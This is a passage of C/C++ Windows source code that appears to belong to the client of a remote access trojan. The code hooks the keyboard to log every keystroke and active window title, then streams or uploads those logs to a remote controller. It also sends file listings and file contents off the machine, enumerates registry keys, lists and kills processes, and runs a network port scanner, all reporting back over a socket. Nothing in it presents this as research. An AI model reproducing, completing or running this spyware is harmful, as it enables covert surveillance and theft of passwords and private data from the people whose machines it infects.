         if(strstr(FileExtention, ".MP3") || strstr(FileExtention, ".mp3") || strstr(FileExtention, ".WAV") || strstr(FileExtention, ".wav")|| strstr(FileExtention, "MP4.")|| strstr(FileExtention, ".mp4")/*|| strstr(FileExtention, ".ICO")|| strstr(FileExtention, ".ico")|| strstr(FileExtention, ".PIF")|| strstr(FileExtention, ".pif")|| strstr(FileExtention, ".BMP")|| strstr(FileExtention, ".bmp")|| strstr(FileExtention, ".PNG")|| strstr(FileExtention, ".png")|| strstr(FileExtention, ".jpe")|| strstr(FileExtention, ".JPE")*/)
         {
             SEND.File_type = 6;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".WMV") || strstr(FileExtention, ".wmv") || strstr(FileExtention, ".AVI") || strstr(FileExtention, ".avi")|| strstr(FileExtention, ".MPG")|| strstr(FileExtention, ".mpg")|| strstr(FileExtention, ".MPEG")|| strstr(FileExtention, ".mpeg")|| strstr(FileExtention, ".FLV")|| strstr(FileExtention, ".flv")/*|| strstr(FileExtention, ".BMP")|| strstr(FileExtention, ".bmp")|| strstr(FileExtention, ".PNG")|| strstr(FileExtention, ".png")|| strstr(FileExtention, ".jpe")|| strstr(FileExtention, ".JPE")*/)
         {
             SEND.File_type = 11;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".HTML") || strstr(FileExtention, ".html") || strstr(FileExtention, ".PHP") || strstr(FileExtention, ".php")|| strstr(FileExtention, ".MHTML")|| strstr(FileExtention, ".mhtml")|| strstr(FileExtention, ".XML")|| strstr(FileExtention, ".xml")|| strstr(FileExtention, ".JS")|| strstr(FileExtention, ".js")/*|| strstr(FileExtention, ".")|| strstr(FileExtention, ".bmp")|| strstr(FileExtention, ".PNG")|| strstr(FileExtention, ".png")|| strstr(FileExtention, ".jpe")|| strstr(FileExtention, ".JPE")*/)
         {
             SEND.File_type = 7;
             goto SENDFILE;
         }

         else
         {
             SEND.File_type = 0;
             goto SENDFILE;
         }

SENDFILE:
         ZeroMemory(&FileExtention[0],10);
     	 SEND.PacketType = SEND_FILES;

SEND_FILE:

	 if(send(Socket,(char*)&SEND,HeadSize,0)==SOCKET_ERROR)
	 {
        if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
        {
         return 0;
        }
        Sleep(50);
        goto SEND_FILE;
	 }

	     ZeroMemory(&SEND.File[0],sizeof(SEND.File));

         Sleep(10);

      }
      //Sleep(10);

}while (FindNextFile(hFind, &ffd) != 0);

   dwError = GetLastError();
   if (dwError != ERROR_NO_MORE_FILES)
   {
	   Sleep(100);
   }

   FindClose(hFind);
   return 0;
}

char Data1[265];
char Data2[265];


/*int SearchDirectory(std::vector<std::string> &refvecFiles,
                    const std::string &refcstrRootDirectory,
                    const std::string &refcstrExtension,
                    bool bSearchSubdirectories = true)
{
   std::string strFilePath; // Filepath
   std::string strPattern; // Pattern
   std::string strExtension; // Extension
   HANDLE hFile; // Handle to file
   WIN32_FIND_DATA FileInformation; // File information


   strPattern = refcstrRootDirectory + "\\*.*";

   hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
   if(hFile != INVALID_HANDLE_VALUE)
   {
      do
      {
         if(FileInformation.cFileName[0] != '.')
         {
            strFilePath.erase();
            strFilePath = refcstrRootDirectory + "\\" + FileInformation.cFileName;

            if(FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
               if(bSearchSubdirectories)
               {
                  // Search subdirectory
                  int iRC = SearchDirectory(refvecFiles,
                     strFilePath,
                     refcstrExtension,
                     bSearchSubdirectories);
                  if(iRC)
                     return iRC;
               }
            }
            else
            {
               // Check extension
               strExtension = FileInformation.cFileName;
               strExtension = strExtension.substr(strExtension.rfind(".") + 1);

               if(strExtension == refcstrExtension)
               {
                  // Save filename
                  refvecFiles.push_back(strFilePath);
               }
            }
         }
      } while(::FindNextFile(hFile, &FileInformation) == TRUE);

      // Close handle
      ::FindClose(hFile);

      DWORD dwError = ::GetLastError();
      if(dwError != ERROR_NO_MORE_FILES)
         return dwError;
   }

   return 0;
}


int list_dir()
{
   int iRC = 0;
   std::vector<std::string> vecAviFiles;
   std::vector<std::string> vecTxtFiles;
   char Helper[MAX_PATH];



   // Search 'C:/Program Files/BitComet/Downloads' for '.avi' files including subdirectories
   iRC = SearchDirectory(vecAviFiles,"C:\\Users\\" Recv.SearchDir, Recv.SearchExtention"txt");
   if(iRC)
   {
      std::cout << "Error " << iRC << std::endl;
      return -1;
   }

   // Print results
   for(std::vector<std::string>::iterator iterAvi = vecAviFiles.begin();
   iterAvi != vecAviFiles.end();
   ++iterAvi)
   {
      ZeroMemory(&Helper[0],sizeof(&Helper));
      sprintf(Helper,"%s",*iterAvi);
      lstrcpy(SEND.FoundDir,Helper);
      SEND.PacketType = SEND_SEARCH_DIR;
      send(Socket,(char*)&SEND,HeadSize,0);

            ofstream Lfile("list1.txt",ios::app);
      if(Lfile.is_open())
      {
          Lfile<<*iterAvi<<endl;

      }
      Lfile.close();
      Sleep(1000);*/

  // }
   //Sleep(5);
   // Search 'c:\textfiles' for '.txt' files excluding subdirectories
   /*iRC = SearchDirectory(vecTxtFiles, "C:\\", "txt", false);
   if(iRC)
   {
      std::cout << "Error " << iRC << std::endl;
      return -1;
   }

   // Print results
   for(std::vector<std::string>::iterator iterTxt = vecTxtFiles.begin();
   iterTxt != vecTxtFiles.end();
   ++iterTxt)
      //std::cout << *iterTxt << std::endl;*/

   // Wait for keystroke
  // _getch();

  // return 0;
//}





// data structure definition
struct MainThreadParam
{
	DWORD StartIp;
	DWORD EndIp;
	DWORD StartPort;
	DWORD EndPort;
	// notify the main thread the param copy event
	HANDLE hCopyEvent;
};

struct ThreadParam
{
	DWORD Ip;
	DWORD Port;
	// param copy event
	HANDLE hCopyOkEvent;
	// limit the number of threads
	HANDLE hThreadNum;
};

// functions definition
BOOL InitPortScan()
{
	WSADATA WsaData;
	// set socket version=2.2
	WORD WsaVersion=MAKEWORD(2,2);
	// init network
	if(WSAStartup(WsaVersion,&WsaData)!=0)
	{
		//MessageBoxA(NULL,"WSAStartup fail;",NULL,NULL);
		return FALSE;
	}
	return TRUE;
}


DWORD WINAPI PortScanThread(LPVOID LpParam)
{
	ThreadParam param;
	// param copy
	MoveMemory(&param,LpParam,sizeof(param));
	// notify scan main thread to modify child thread param struct
	SetEvent(param.hCopyOkEvent);
	// create socket
	SOCKET sock;
	SOCKADDR_IN sockAddr={0};
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sock==INVALID_SOCKET)
	{

	}
    //MessageBoxA(NULL,"INVALID_SOCKET",NULL,NULL);
	// set value to ip and port
	sockAddr.sin_family=AF_INET;
	sockAddr.sin_addr.s_addr=htonl(param.Ip);
	sockAddr.sin_port=htons(param.Port);
	// make ip address to string
	// convert char* to wchar_t*
	//_bstr_t bs_ip(inet_ntoa(sockAddr.sin_addr));
	//TCHAR* ipChar=bs_ip;

	char *ipChar=inet_ntoa(sockAddr.sin_addr);
	//TCHAR str[200];
	// connect
	if(connect(sock,(SOCKADDR*)&sockAddr,sizeof(sockAddr))==0)
    {
	   sprintf(SEND.ScanIP,"%s",ipChar);
	   sprintf(SEND.ScanPort,"%d",param.Port);
	   lstrcpy(SEND.ScanStat,"Open");
	   SEND.ScanImg = 1;
    }

	else
	{
	   sprintf(SEND.ScanIP,"%s",ipChar);
	   sprintf(SEND.ScanPort,"%d",param.Port);
	   lstrcpy(SEND.ScanStat,"Closed");
	   SEND.ScanImg = 0;
	}

    SEND.PacketType = SCAN_PORT;
    send(Socket,(char*)&SEND,HeadSize,0);

	// release a semaphore
	ReleaseSemaphore(param.hThreadNum,1,NULL);
	// close socket
	closesocket(sock);

	return 0;
}

DWORD WINAPI MainThread(LPVOID LpParam)
{
	MainThreadParam param;
	// param copy
	MoveMemory(&param,LpParam,sizeof(param));
	// event->notify the parent thread param copy finished
	SetEvent(param.hCopyEvent);
	// init thread param
	ThreadParam threadParam={0};
	// create thread->thread param
	HANDLE hThreadCopyOkEvent=CreateEvent(NULL,TRUE,FALSE,NULL);
	threadParam.hCopyOkEvent=hThreadCopyOkEvent;
	// create semaphore
	HANDLE hThreadNum=CreateSemaphore(NULL,256,256,NULL);
	threadParam.hThreadNum=hThreadNum;
	// for each loop create thread to connect
	for (DWORD Ip=param.StartIp; Ip<=param.EndIp;Ip++)
	{
		for (DWORD Port=param.StartPort;Port<=param.EndPort;Port++)
		{
			// wait hThreadNum send out signal
			DWORD waitRes=WaitForSingleObject(hThreadNum,200);
			if(waitRes==WAIT_OBJECT_0)
			{
				threadParam.Ip=Ip;
				threadParam.Port=Port;
				CreateThread(NULL,
					0,
					PortScanThread,
					&threadParam,
					0,
					NULL);
				// wait the child thread to finish the param copy
				WaitForSingleObject(threadParam.hCopyOkEvent,INFINITE);
				// reset copy event semaphore state
				ResetEvent(threadParam.hCopyOkEvent);
			}

			else if (waitRes==WAIT_TIMEOUT)
			{
				Port--;
				continue;
			}
			Sleep(30);
		}
	}
	return 0;
}

BOOL StartScanner(DWORD StartIp, DWORD EndIp, DWORD StartPort,DWORD EndPort)
{
	// init the port scan
	InitPortScan();
	// main thread param
	MainThreadParam param;
	// param copy event
	HANDLE hMainCopyEvent=CreateEvent(NULL,TRUE,FALSE,NULL);
	// params copy
	param.hCopyEvent=hMainCopyEvent;
	param.StartIp=StartIp;
	param.EndIp=EndIp;
	param.StartPort=StartPort;
	param.EndPort=EndPort;
	// create main scan thread
	CreateThread(NULL,0,MainThread,(LPVOID*)&param,0,NULL);
	// wait main thread event
	WaitForSingleObject(hMainCopyEvent,INFINITE);
	// reset event
	ResetEvent(hMainCopyEvent);
	return TRUE;
}





DWORD WINAPI Downloadfile(LPVOID lParam)
{
   FILE *DFILE;
   int Smallsize=0;
   int Bigsize=0;
   int Nsize=0;
   char DFilePath[MAX_PATH];
   lstrcpy(DFilePath,Recv.FileName);

   DFILE = fopen(DFilePath,"rb");


   ZeroMemory(&DLSEND,sizeof(FTRANSFER));
   fseek(DFILE,0,SEEK_END);
   Bigsize = ftell(DFILE);
   fseek(DFILE,0,SEEK_SET);

   Smallsize = Bigsize - Nsize;
   DLSEND.DLFLen = Smallsize;


SET_DL:

   DLSEND.PacketType = SET_FDLOAD;
   if(send(DLSocket,(char*)&DLSEND,DLHeadSize,0)==SOCKET_ERROR)
   {
      //MessageBox(NULL,"SET ERROR","SET ERROR", MB_OK | MB_ICONERROR);

      if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
      {
        return 0;
      }

      Sleep(50);
      goto SET_DL;
   }



   while(Nsize<Bigsize)
   {
     /*if(Smallsize<sizeof(DLSEND.FDload))
     {

				            fread(DLSEND.FDload,1,Smallsize,DFILE);

            Resend_File:
				            DLSEND.PacketType = FDLOAD;
                            if(send(DLSocket,(char*)&DLSEND,DLHeadSize,0)==SOCKET_ERROR)
                            {

                                //MessageBox(NULL,"SEND ERROR","SEND ERROR", MB_OK | MB_ICONERROR);
                                Sleep(50);
                                goto Resend_File;
                            }

     }

     else if(Smallsize>sizeof(DLSEND.FDload))*/
     //{
                            ZeroMemory(&DLSEND.FDload[0],sizeof(DLSEND.FDload));
				            fread(DLSEND.FDload,1,sizeof(DLSEND.FDload),DFILE);

            Resend_File2:
				            DLSEND.PacketType = FDLOAD;
                            if(send(DLSocket,(char*)&DLSEND,DLHeadSize,0)==SOCKET_ERROR)
                            {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                                //MessageBox(NULL,"SEND ERROR","SEND ERROR", MB_OK | MB_ICONERROR);
                                Sleep(50);
                                goto Resend_File2;
                            }

    // }

     //Sleep(1);
     Nsize+=sizeof(DLSEND.FDload);
    Sleep(10);
   }
  // Sleep(5);

            Send_end_File:
				            DLSEND.PacketType = END_FDLOAD;
                            if(send(DLSocket,(char*)&DLSEND,DLHeadSize,0)==SOCKET_ERROR)
                            {
                                //MessageBox(NULL,"END ERROR","END ERROR", MB_OK | MB_ICONERROR);
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                                Sleep(50);
                                goto Send_end_File;
                            }


}






int Extract_Logs()
{

				        FILE* LogFile;
				        //FILE* LOGFILE;
				        int Bigsize;
				        int Smallsize;
				        int Nsize;
				        //long offset;
                       char logbuff[100]={0};
				       if((LogFile = fopen(FileNameA,"rb"))==NULL)
				       {

				       }
				        fseek(LogFile,0,SEEK_END);
                        Bigsize = ftell(LogFile);
                        fseek(LogFile,0,SEEK_SET);

                        Smallsize = Bigsize - Nsize;
                        FSEND.PicLen = Smallsize;
                        FSEND.ActPicLen = FSEND.PicLen;
                        sprintf(FSEND.PicSize, "%d",FSEND.ActPicLen);

 SET_LOG:
                        FSEND.PacketType = SET_KEYLOG;
                        if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                        {

                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                          //MessageBox(NULL,"SET ERROR","SET ERROR", MB_OK | MB_ICONERROR);
                          Sleep(50);
                          goto SET_LOG;
                        }


            while(Nsize<Bigsize)
            {

				        if(Smallsize<=sizeof(FSEND.Keylog))
				        {
				            fread(FSEND.Keylog,1,Smallsize,LogFile);

            Resend_log:
				            FSEND.PacketType = LOGS_SENT;
                            if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                            {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                                Sleep(50);
                                goto Resend_log;
                                //MessageBox(NULL,"SEND ERROR","SEND ERROR", MB_OK | MB_ICONERROR);
                            }
                                   //LOGFILE = fopen ("klog.txt","wb");

					             // fwrite(FSEND.Keylog,Smallsize,1, LOGFILE);



				        }

				        else if(Smallsize>sizeof(FSEND.Keylog))
				        {
				           fread(FSEND.Keylog,1,sizeof(FSEND.Keylog),LogFile);

                            if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                            {
                             return 0;
                            }


		   Resend_log2:

				            FSEND.PacketType = LOGS_SENT;
                            if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                            {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                               Sleep(50);
                               goto Resend_log2;
                               //MessageBox(NULL,"SEND ERROR","SEND ERROR", MB_OK | MB_ICONERROR);
                            }

                                   //LOGFILE = fopen ("klog.txt","a+b");

					              //fwrite(FSEND.Keylog,sizeof(FSEND.Keylog),1, LOGFILE);

				        }

			Nsize+=sizeof(FSEND.Keylog);
			Sleep(5);
            }
            fclose(LogFile);

            send_end_log:

				            FSEND.PacketType = END_KEYLOG;
                            if(send(FSocket,(char*)&FSEND,FHeadSize,0)==SOCKET_ERROR)
                            {
                              if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
                              {
                                return 0;
                              }

                               Sleep(50);
                               goto send_end_log;
                               //MessageBox(NULL,"END ERROR","END ERROR", MB_OK | MB_ICONERROR);

                            }

                           // fclose(LOGFILE);

}



/////////////////////////////////////////////////////////////////////////////////////////
//Query Reg keys
int QueryKey(int ID, char * Path)
{
    HKEY hKey;

    switch(ID)
    {
        case 0:
            if( RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT(Path),0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                 goto Go_on;
            }

        case 1:
            if( RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(Path),0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                 goto Go_on;
            }

        case 2:
            if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(Path),0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                 goto Go_on;
            }

        case 3:
            if( RegOpenKeyEx(HKEY_USERS, TEXT(Path),0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                 goto Go_on;
            }

        case 4:
            if( RegOpenKeyEx(HKEY_CURRENT_CONFIG, TEXT(Path),0, KEY_READ, &hKey) == ERROR_SUCCESS)
            {
                goto Go_on;
            }

    }

    Go_on:

    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name
    DWORD    cchClassName = MAX_PATH;  // size of class string
    DWORD    cSubKeys=0;               // number of subkeys
    DWORD    cbMaxSubKey;              // longest subkey size
    DWORD    cchMaxClass;              // longest class string
    DWORD    cValues;              // number of values for key
    DWORD    cchMaxValue;          // longest value name
    DWORD    cbMaxValueData;       // longest value data
    DWORD    cbSecurityDescriptor; // size of security descriptor
    FILETIME ftLastWriteTime;      // last write time
	char     Value [1024] = "";
    DWORD i, retCode;

    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;

	HKEY hKkey;

	TCHAR data [100] = "";
    unsigned long datalen = sizeof(data);
    unsigned long datatype;


    // Get the class name and the value count.
    retCode = RegQueryInfoKey(
        hKey,                    // key handle
        achClass,                // buffer for class name
        &cchClassName,           // size of class string
        NULL,                    // reserved
        &cSubKeys,               // number of subkeys
        &cbMaxSubKey,            // longest subkey size
        &cchMaxClass,            // longest class string
        &cValues,                // number of values for this key
        &cchMaxValue,            // longest value name
        &cbMaxValueData,         // longest value data
        &cbSecurityDescriptor,   // security descriptor
        &ftLastWriteTime);       // last write time

    // Enumerate the subkeys, until RegEnumKeyEx fails.

    if (cSubKeys)
    {
        //printf( "\nNumber of subkeys: %d\n", cSubKeys);

        for (i=0; i<cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                     achKey,
                     &cbName,
                     NULL,
                     NULL,
                     NULL,
                     &ftLastWriteTime);
            if (retCode == ERROR_SUCCESS)
            {
                //_tprintf(TEXT("(%d) %s\n"), i+1, achKey);
                ZeroMemory(&SEND.KeyFold, sizeof(SEND.KeyFold));
				strcpy(SEND.KeyFold, achKey);


				//MessageBox(NULL, Path, "", MB_OK);
				//Key.ID = LocalId;
				//Key.ID2 = 0;
				SEND.RegID = 0;
				SEND.PacketType = SEND_REG_MAN;


				if (RegQueryValueExA(hKey, "", NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
				{
				//	MessageBox(NULL, data, "data", MB_OK);
				}

Try:
				Sleep(10);
				if(send(Socket,(char*)&SEND,HeadSize,0) == SOCKET_ERROR)
				{
							if(WSAGetLastError() == WSAENETRESET || WSAENETUNREACH || WSAECONNRESET || WSAENETDOWN)
							{
							 //MessageBox(NULL, "CONNECTION LOST", "Connection", MB_OK);
							 return 0;
							}
				goto Try;
				}

				Sleep(30);

            }
        }
    }

    // Enumerate the key values.

    if (cValues)
    {
        for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++)
        {
            cchValue = MAX_VALUE_NAME;
            achValue[0] = '\0';
            retCode = RegEnumValue(hKey, i,
                achValue,
                &cchValue,
                NULL,
                NULL,
                NULL,
                NULL);

            if (retCode == ERROR_SUCCESS )
            {
                //_tprintf(TEXT("(%d) %s\n"), i+1, achValue);
				//strcpy(Key.Data, achValue);
				ZeroMemory(data, sizeof(data));
				ZeroMemory(&SEND.KeyVal, sizeof(SEND.KeyVal));
			switch(ID)
			{
				 case 0:
						if( RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							strcpy(SEND.KeyVal, achValue);
							SEND.datatype = datatype;
					    	strcpy(SEND.keydata, data);
							}
						}
						break;

					 case 1:
						if( RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							strcpy(SEND.KeyVal, achValue);
							SEND.datatype = datatype;
					    	strcpy(SEND.keydata, data);
							}
						}
						break;

					 case 2:
						if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							strcpy(SEND.KeyVal, achValue);
							SEND.datatype = datatype;
					    	strcpy(SEND.keydata, data);
               /* ofstream filr("yuk.txt",ios::app);
				filr<<data<<endl;
				filr.close();*/
							}
						}
						break;

					 case 3:
						if( RegOpenKeyEx(HKEY_USERS, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
                            strcpy(SEND.KeyVal, achValue);
							SEND.datatype = datatype;
					    	strcpy(SEND.keydata, data);
							}
						}
						break;
					 case 4:
						if( RegOpenKeyEx(HKEY_CURRENT_CONFIG, TEXT(Path),0, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
						{
							if (RegQueryValueExA(hKkey, achValue, NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
							{
							strcpy(SEND.KeyVal, achValue);
							SEND.datatype = datatype;
					    	strcpy(SEND.keydata, data);
							}
						}
						break;
			}



				SEND.RegID = 1;
				SEND.PacketType = SEND_REG_MAN;
				TryA:
				Sleep(30);
				if(send(Socket,(char*)&SEND,HeadSize,0) == SOCKET_ERROR)
				{
					if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
					{
					return 0;
					}

				goto TryA;
				}
				//Sleep(5);
	        }
        }
    }
return 0;
}







char KeyData[4096];

DLLEXPORT LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
static BOOL unicode = FALSE;
static HWND old_active = NULL;
//HWND active;
static HKL keyboardlayout = NULL;
BYTE keyboardState[256] = {0};
KBDLLHOOKSTRUCT keyboard;
DWORD windowThreadProcessId;
//char buff[MAX_LEN];
WCHAR keybuff[255]= {0};
int i;
PACKETHEAD Win;


i = 0;
windowThreadProcessId = 0;

if (nCode < 0)
return CallNextHookEx(theHook, nCode, wParam, lParam);

if((wParam == WM_KEYDOWN)|| (wParam == WM_SYSKEYDOWN)||(wParam == WM_SYSKEYUP)) {
keyboard = *((KBDLLHOOKSTRUCT*)lParam);
GetKeyboardState(keyboardState);



if(keyboard.vkCode == VK_RETURN)
i += sprintf (((char*)keybuff + i), "\n");


if (unicode)

i = ToUnicodeEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, keybuff, (sizeof(keybuff) / 16), (GetKeyState(VK_MENU) >> 7), keyboardlayout);

else

i = ToAsciiEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, ((LPWORD)keybuff), (GetKeyState(VK_MENU) >> 7), keyboardlayout);


sprintf((f_buff + buff_idx), "%s", keybuff);
if(KeyConnect)
	{
	 strcpy(FSEND.Keylog, f_buff);
	 FSEND.PacketType = LOGS_SENT;
	 send(FSocket, (char *)&FSEND, FHeadSize, 0);
	}
	else
	{
	WriteFile(FileHandle, f_buff, strlen(f_buff), &numb_bytes, NULL);
	buff_idx = 0;
	}


}
return CallNextHookEx(theHook, nCode, wParam, lParam);

}



void Msgloop(void)
{
MSG mess;
while (GetMessage(&mess,NULL,0,0))
{
TranslateMessage(&mess);
DispatchMessage(&mess);

}
}




DWORD WINAPI KeyLoggerWin(LPVOID lParam)
{
PACKETHEAD Win;
HWND ForeHandle;
char window_text[500];
char old_window_text[500];
while(1)
{
Sleep(10);
ForeHandle = GetForegroundWindow();
           if (ForeHandle != NULL)
		   {
              if (GetWindowText(ForeHandle, (char*)&window_text, 499) != 0)
			  {
                 if (strcmp(window_text, old_window_text))
				 {
						if(KeyConnect)
					{
					strcpy(FSEND.Keylog, window_text);
                    FSEND.PacketType = LOGS_SENT;
					//Win.ID = LocalId;
                    send(FSocket, (char *)&FSEND, FHeadSize, 0);
                    strcpy(old_window_text, window_text);
					}
					else
					{
					GetTime();
					char logtime[20];
					sprintf(logtime, "%s", Time);
					strcpy(KeyData, "\r\n \r\n[");
					strcat(KeyData, window_text);
					strcat(KeyData, " ]  ");
					strcat(KeyData,"(");
                    strcat(KeyData,logtime);
                    strcat(KeyData,") \r\n  \r\n");
					WriteFile(FileHandle, KeyData, strlen(KeyData), &numb_bytes, NULL);
					strcpy(old_window_text, window_text);
					}
                 }
              }
           }
		   Sleep(1);
}

}

DWORD WINAPI KeyLogger(LPVOID lParam)
{
HINSTANCE exe;
int res = 0;
//PACKETHEAD Win;
if(KeyConnect)
{
//MessageBox(NULL, "CONNECTED", "CONNECTED", MB_OK);
//CreateThread(NULL, 0,SendLog,(LPVOID)FileNameA, 0, &thread);
}
else
{
strcpy(FileNameA, "");
sprintf(FileNameA, "Log%d.txt", KEYID);
FileHandle = CreateFile (FileNameA, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); //FILE_ATTRIBUTE_HIDDEN
}
TerminateThread(WindowLog, 0);
WindowLog = CreateThread(NULL, 0,KeyLoggerWin,(LPVOID)FileNameA, 0, &thread);

WriteFile(FileHandle, FSEND.Keylog, strlen(FSEND.Keylog), &numb_bytes, NULL);
exe = GetModuleHandle(NULL);
if(!exe)
{
res = 1;
}
else
{
theHook = SetWindowsHookEx ( WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, exe, 0);
if(theHook == NULL)
{
//MessageBox(NULL, "NULL", "NULL", MB_OK);
}

Msgloop(); // eternal loop
UnhookWindowsHookEx(theHook);
}
return TRUE;
}






//////////////////////////////////////////////////////////////////////////////////////////////
//Task manager Functions.
HWND GetFirstWindowText(char buf[],unsigned int max_out,int *text_written)
{
     HWND ret_val;
     ret_val = GetForegroundWindow();
     if(!text_written) GetWindowText(ret_val,buf,max_out);
     else *text_written = GetWindowText(ret_val,buf,max_out);
     return ret_val;
}

int GetNextWindowText(char buf[],unsigned int max_out,HWND* handle)
{
    *handle = GetNextWindow(*handle,GW_HWNDNEXT);
    return GetWindowText(*handle,buf,max_out);
}

BOOL ShowTasks()
{     HWND Windows;
      char Data[265];

     GlobalMemoryStatus(&Memory);
     sprintf(SEND.PhyMem, "Physical Memory: %d", Memory.dwMemoryLoad);

     Windows = GetFirstWindowText(Data, sizeof(Data), 0);

      strcpy(SEND.Windows, Data);
      SEND.PacketType = SEND_WINDOWS;
      send(Socket,(char*)&SEND,HeadSize,0);



     while(Windows)
     {
        GetNextWindowText(Data, sizeof(Data), &Windows);

        if(*Data && IsWindowVisible(Windows))
        {
           strcpy(SEND.Windows, Data);
           SEND.PacketType = SEND_WINDOWS;
           send(Socket,(char*)&SEND,HeadSize,0);
           Sleep(30);

        }
     }
	return TRUE;
}




int SendTask()
{
    int ID;
	int Priority = 0;
    HANDLE Snap;
    PROCESSENTRY32 proc32;

  GlobalMemoryStatus(&Memory);
  sprintf(SEND.PhyMem, "Physical Memory: %d%", Memory.dwMemoryLoad);

  Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes

  if(Snap==INVALID_HANDLE_VALUE)
  {
    return EXIT_FAILURE;
  }

  proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure

  while((Process32Next(Snap,&proc32))==TRUE)//while we haven't reached the final process
  {
     strcpy(SEND.Procs, proc32.szExeFile);

	 ZeroMemory(&SEND.PID[0],sizeof(SEND.PID));
     sprintf(&SEND.PID[0],"%d",proc32.th32ProcessID);

	 ZeroMemory(&SEND.Threads[0],sizeof(SEND.Threads));
     sprintf(&SEND.Threads[0],"%d",proc32.cntThreads);

     ZeroMemory(&SEND.ParentPID[0],sizeof(SEND.ParentPID));
     sprintf(&SEND.ParentPID[0],"%d",proc32.th32ParentProcessID);

	 Priority = proc32.pcPriClassBase;

	 if(Priority > 7 && Priority < 12)
	 {
		strcpy(SEND.PRIORITY, "Normal");
	 }
	 if(Priority < 7)
	 {
		strcpy(SEND.PRIORITY, "Low");
	 }
	 if(Priority > 12)
	 {
		strcpy(SEND.PRIORITY, "High");
	 }



   SEND.PacketType = SEND_TASKS;
   send(Socket,(char*)&SEND,HeadSize,0);

	Sleep(50);
  }

  return 0;
}

BOOL KillProcess(char *ProcessName)
{
     int result;
     HANDLE hProcessSnap = 0;
	 HANDLE hProcess = 0;
	 HANDLE hSnapshot = 0;
	 PROCESSENTRY32 pe32;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

     pe32.dwSize = sizeof(PROCESSENTRY32);

     Process32First(hProcessSnap, &pe32);

     while(Process32Next(hProcessSnap, &pe32))
     {
        if(!strcmp(pe32.szExeFile, ProcessName))
        {
           result = 1;

           hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);

           if(TerminateProcess(hProcess, 0) == 0)
           {
              //MessageBox(NULL, "Terminating process failed !", "KillProcess", MB_OK | MB_ICONERROR);
           }

           else
           {

           }
        }
     }

     CloseHandle(hProcess);
     CloseHandle(hProcessSnap);

     if(result == 0)
     //MessageBox(NULL, "Process cannot be found !", "KillProcess", MB_OK | MB_ICONWARNING);

     result = 0;
	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////////



bool GetOSVersion()
{
PGNSI pGNSI;
bool bOsVersionInfoEx;
bool ntOS;

